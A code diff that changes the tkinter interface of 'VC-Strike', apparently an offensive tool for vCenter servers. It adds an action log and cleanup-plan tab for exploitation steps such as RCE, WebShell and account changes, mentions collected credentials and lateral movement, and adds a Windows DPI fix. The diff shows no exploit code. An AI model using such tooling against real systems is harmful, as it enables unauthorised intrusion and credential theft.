         of = ttk.LabelFrame(f, text="输出 / 已收集凭据")
         of.grid(row=3, column=0, sticky="nsew", pady=4)
-        self.postex_out = tk.Text(of, bg=COLORS["term"], fg=COLORS["termfg"],
+        self.postex_out = tk.Text(of, bg=COLORS["logbg"], fg=COLORS["fg"],
                                   relief="flat", font=("Consolas", 9))
         self.postex_out.pack(fill="both", expand=True, padx=4, pady=4)
         ttk.Label(of, text="机器账户可用于直连 LDAPS 做任意 LDAP 操作，或作为横向凭据。"
@@ -1299,18 +1486,42 @@ class ToolApp:
     def _build_tab_clean(self):
         f = self.tab_clean
         f.columnconfigure(0, weight=1)
-        f.rowconfigure(1, weight=1)
+        f.rowconfigure(2, weight=1)
         top = ttk.Frame(f)
         top.grid(row=0, column=0, sticky="ew", pady=4)
-        ttk.Button(top, text="生成清理方案（聚合本次会话）", style="Acc.TButton",
+        ttk.Button(top, text="生成清理方案 [F6]", style="Acc.TButton",
                    command=self._clean_gen).pack(side="left")
         ttk.Button(top, text="复制到剪贴板",
                    command=self._clean_copy).pack(side="left", padx=6)
-        self.clean_txt = tk.Text(f, bg=COLORS["term"], fg=COLORS["fg"],
-                                 relief="flat", font=("Consolas", 9))
-        self.clean_txt.grid(row=1, column=0, sticky="nsew", pady=4)
+        ttk.Label(top, text="每个利用动作发生时自动登记到此页", style="Muted.TLabel").pack(
+            side="left", padx=10)
+
+        awf = ttk.LabelFrame(f, text="本会话已登记动作")
+        awf.grid(row=1, column=0, sticky="ew", pady=4)
+        self.act_tree = ttk.Treeview(awf, columns=("time", "type", "target", "detail"),
+                                     show="headings", height=5)
+        for c, t, w in (("time", "时间", 100), ("type", "动作", 130),
+                        ("target", "目标", 120), ("detail", "详情", 560)):
+            self.act_tree.heading(c, text=t)
+            self.act_tree.column(c, width=w, anchor="w")
+        self.act_tree.pack(fill="x", padx=4, pady=4)
+
+        self.clean_txt = tk.Text(f, bg=COLORS["logbg"], fg=COLORS["fg"],
+                                 relief="flat", highlightthickness=1,
+                                 highlightbackground=COLORS["border"],
+                                 highlightcolor=COLORS["border"],
+                                 font=("Consolas", 9))
+        self.clean_txt.grid(row=2, column=0, sticky="nsew", pady=4)
+        self.clean_txt.insert("1.0", "（尚无清理方案）\n"
+                                     "点击上方「生成清理方案」后，此处显示本次会话的清理步骤清单。\n"
+                                     "写入验证 / RCE / WebShell / 账户操作等动作发生时会自动登记。")
 
     def _clean_gen(self):
+        if hasattr(self, "act_tree"):
+            self.act_tree.delete(*self.act_tree.get_children())
+            for a in self.actions:
+                self.act_tree.insert("", "end", values=(
+                    a["time"], a["type"], a["target"], a["detail"]))
         lines = ["# ===== VC-Strike 清理方案（%s）=====" % time.strftime("%Y-%m-%d %H:%M:%S"),
                  "# 在目标 vCenter 上（已获得的 root shell / 授权运维通道）执行：", ""]
         if not self.actions:
@@ -1352,7 +1563,7 @@ class ToolApp:
                                     self.log("[+] 已复制", "+"))).pack(side="left")
         ttk.Label(top, text="防御侧自查 / 排查 / 缓解 —— 来自公开 POC 仓库与 QTR IR 案例",
                   style="Muted.TLabel").pack(side="left", padx=8)
-        t = tk.Text(f, bg=COLORS["term"], fg=COLORS["fg"], relief="flat",
+        t = tk.Text(f, bg=COLORS["logbg"], fg=COLORS["fg"], relief="flat",
                     font=("Consolas", 9))
         t.grid(row=1, column=0, sticky="nsew", pady=4)
         from .data import ABOUT_TEXT, REFERENCES
@@ -1362,10 +1573,26 @@ class ToolApp:
         t.configure(state="disabled")
 
 
+def ensure_dpi_awareness():
+    """声明 Per-Monitor DPI 感知：否则 Windows 位图拉伸整个窗口，文字发糊，
+    且 Tk 坐标与物理像素错位（截图/多显示器均受影响）。必须在创建 Tk 前调用。"""
+    if sys.platform != "win32":
+        return
+    try:
+        import ctypes
+        try:
+            ctypes.windll.shcore.SetProcessDpiAwareness(2)   # PER_MONITOR_DPI_AWARE
+        except Exception:
+            ctypes.windll.user32.SetProcessDPIAware()
+    except Exception:
+        pass
+
+
 def run_gui():
     if tk is None:
         print("未找到 tkinter（无显示环境？）。请使用 CLI：python -m vcstrike --help")
         return 1
+    ensure_dpi_awareness()
     root = tk.Tk()
     ToolApp(root)
     root.mainloop()
